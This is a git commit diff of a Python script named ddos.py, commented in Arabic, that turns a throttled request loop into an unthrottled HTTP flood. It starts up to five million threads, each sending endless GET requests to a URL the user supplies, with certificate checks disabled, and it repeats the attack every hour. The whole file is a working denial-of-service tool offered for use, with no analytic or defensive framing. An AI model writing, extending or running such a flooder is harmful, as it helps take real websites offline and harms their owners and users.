3e91bbf0af4fdbaa59133bf52c0165216dd474a8
rrqr <76810190+rrqr@users.noreply.github.com>
2024-06-10 15:38:14 +0300

    ddos.py

--- ddos.py
+++ ddos.py
@@ -1,32 +1,45 @@
 import requests
+import threading
 import urllib3
 import time
-from concurrent.futures import ThreadPoolExecutor
 
 # تعطيل التحقق من صحة شهادة SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+fake_ip = '182.21.20.32'
+
 headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 }
 
+# إنشاء جلسة واحدة للاستخدام المتكرر
+session = requests.Session()
+session.verify = False
+
 def attack(url):
-    session = requests.Session()
-    session.verify = False
     while True:
         try:
             response = session.get(url, headers=headers)
             print("تم إرسال الطلب إلى:", url)
-        except requests.RequestException as e:
+        except Exception as e:
             print("حدث خطأ:", e)
-        time.sleep(1)  # تأخير لإعطاء وقت للموارد
 
 def start_attack(url):
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        for _ in range(50):
-            executor.submit(attack, url)
+    for i in range(5000000):
+        thread = threading.Thread(target=attack, args=(url,))
+        thread.start()
+
+    # الطلب الأولي خارج الهجمات
+    try:
+        response = session.get(url, headers=headers)
+        print(response.text)
+    except Exception as e:
+        print("حدث خطأ أثناء الطلب الأولي:", e)
 
 url = input("أدخل رابط الهدف: ")
-start_attack(url)
+
+print("بدء الهجوم بشكل مستمر على مدار 24 ساعة")
+
 while True:
-    time.sleep(3600)  # استمر في العمل لمدة ساعة (3600 ثانية)
+    start_attack(url)
+    time.sleep(3600)  # انتظار ساعة قبل تكرار الهجوم
